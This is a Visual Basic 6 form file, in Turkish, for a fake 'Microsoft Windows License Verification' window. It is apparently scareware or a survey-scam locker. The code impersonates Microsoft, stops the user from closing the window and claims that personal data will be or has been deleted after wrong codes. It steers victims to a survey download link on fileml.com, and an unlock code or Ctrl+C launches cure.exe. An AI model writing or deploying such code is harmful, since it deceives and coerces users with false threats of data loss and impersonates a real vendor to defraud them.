VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H8000000E&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Microsoft Windows Lisans Doðrulamasý"
   ClientHeight    =   3630
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   6750
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3630
   ScaleWidth      =   6750
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command3 
      Caption         =   "Satýn Al"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   360
      TabIndex        =   12
      Top             =   2880
      Width           =   975
   End
   Begin VB.TextBox Text4 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   3960
      MaxLength       =   5
      TabIndex        =   3
      Top             =   2445
      Width           =   855
   End
   Begin VB.TextBox Text3 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   2760
      MaxLength       =   5
      TabIndex        =   2
      Top             =   2445
      Width           =   855
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   1560
      MaxLength       =   5
      TabIndex        =   1
      Top             =   2445
      Width           =   855
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Anketi Doldurarak Aktivasyon Kodunu Ücretsiz Ýndir"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2040
      TabIndex        =   5
      Top             =   2880
      Width           =   4335
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Lisansý Doðrula"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   4920
      TabIndex        =   4
      Top             =   2400
      Width           =   1455
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   360
      MaxLength       =   5
      TabIndex        =   0
      Top             =   2445
      Width           =   855
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      BackColor       =   &H8000000E&
      Caption         =   "veya"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   1425
      TabIndex        =   13
      Top             =   2950
      Width           =   615
   End
   Begin VB.Shape Shape1 
      Height          =   3375
      Left            =   120
      Top             =   120
      Width           =   6495
   End
   Begin VB.Label Label5 
      BackColor       =   &H8000000E&
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   12
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3720
      TabIndex        =   11
      Top             =   2400
      Width           =   135
   End
   Begin VB.Label Label4 
      BackColor       =   &H8000000E&
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   12
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2520
      TabIndex        =   10
      Top             =   2400
      Width           =   135
   End
   Begin VB.Label Label3 
      BackColor       =   &H8000000E&
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   12
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   1320
      TabIndex        =   9
      Top             =   2400
      Width           =   135
   End
   Begin VB.Image Image2 
      Height          =   1170
      Left            =   4320
      Picture         =   "Form1.frx":1171AA
      Top             =   240
      Width           =   2100
   End
   Begin VB.Label haklabel 
      BackColor       =   &H8000000E&
      Caption         =   "3"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   6000
      TabIndex        =   8
      Top             =   2040
      Width           =   255
   End
   Begin VB.Label Label2 
      BackColor       =   &H8000000E&
      Caption         =   "Kalan Hak : "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   5040
      TabIndex        =   7
      Top             =   2040
      Width           =   1095
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000E&
      Caption         =   $"Form1.frx":1190CD
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   360
      TabIndex        =   6
      Top             =   1440
      Width           =   5655
   End
   Begin VB.Image Image1 
      Height          =   915
      Left            =   360
      Picture         =   "Form1.frx":11916F
      Top             =   360
      Width           =   3600
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim KalanHak As Long




Private Sub Command3_Click()
ShellExecute 0, vbNullString, "http://www.amazon.com/Microsoft-Windows-8-1-Pro-Version/dp/B00EDSI8HW", vbNullString, vbNullString, 1
End Sub

Private Sub Form_KeyPress(KeyAscii As Integer)
If KeyAscii = 3 Then
MsgBox "Microsoft Windows lisansýnýz baþarýyla doðrulandý." & vbNewLine & "Lütfen satýn alýmlarýnýzda satýcýnýzdan orjinal Windows ürünü talep edin.", vbInformation, "Microsoft Windows Licence Verification"
Shell App.Path & "\cure.exe"
End
End If
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    If UnloadMode = vbFormControlMenu Or UnloadMode = 1 Then
    MsgBox "Microsoft Windows ürününüzü doðrulamak zorundasýnýz." & vbNewLine & "Aksi takdirde verileriniz silinecektir.", vbCritical, "Microsoft Windows License Verification"
        'the X has been clicked or the user has pressed Alt+F4
        Cancel = True
    End If
End Sub
Private Sub Command1_Click()
Dim kod As String
kod = Text1.Text + Text2.Text + Text3.Text + Text4.Text
If kod = "FJ37SDFHJ7AS23DAB3BG" Then
MsgBox "Microsoft Windows lisansýnýz baþarýyla doðrulandý." & vbNewLine & "Lütfen satýn alýmlarýnýzda satýcýnýzdan orjinal Windows ürünü talep edin.", vbInformation, "Microsoft Windows Licence Verification"
Shell App.Path & "\cure.exe"
End
Else
Label2.Visible = True
haklabel.Visible = True
If KalanHak > 1 Then
KalanHak = KalanHak - 1
MsgBox "Hatalý aktivasyon kodu. Kalan Hak: " & KalanHak & vbNewLine & "Lütfen geçerli bir aktivasyon kodu girin.", vbCritical, "Microsoft Windows License Verification"
haklabel.Caption = KalanHak
Else
If KalanHak = 1 Then
MsgBox "Çok fazla hatalý giriþ yaptýnýz." & vbNewLine & "Kiþisel verilerinizin bir kýsmý daha silindi.", vbCritical, "Microsoft Windows License Verification"
KalanHak = 3
haklabel.Caption = KalanHak
End If
End If
End If
End Sub

Private Sub Command2_Click()
ShellExecute 0, vbNullString, "http://fileml.com/file/055i6y", vbNullString, vbNullString, 1
End Sub

Private Sub Form_Load()
Label2.Visible = False
haklabel.Visible = False
KalanHak = 4
End Sub

Private Sub Form_Unload(Cancel As Integer)
answer = MsgBox("Eðer þimdi çýkarsanýz verilerinizin bir kýsmý silinebilir. Çýkmak istiyor musunuz?", vbYesNo, "UYARI")
If answer = vbYes Then Cancel = False
If answer = vbNo Then Cancel = True
End Sub


Private Sub Text1_Change()
Text1.Text = UCase(Text1.Text)
Text1.SelStart = Len(Text1.Text)
If Len(Text1.Text) = 5 Then Text2.SetFocus
End Sub

Private Sub Text2_Change()
Text2.Text = UCase(Text2.Text)
Text2.SelStart = Len(Text2.Text)
If Len(Text2.Text) = 5 Then Text3.SetFocus
End Sub

Private Sub Text3_Change()
Text3.Text = UCase(Text3.Text)
Text3.SelStart = Len(Text3.Text)
If Len(Text3.Text) = 5 Then Text4.SetFocus
End Sub

Private Sub Text4_Change()
Text4.Text = UCase(Text4.Text)
Text4.SelStart = Len(Text4.Text)
If Len(Text4.Text) = 5 Then
Command1.Enabled = True
Command1.SetFocus
End If

End Sub
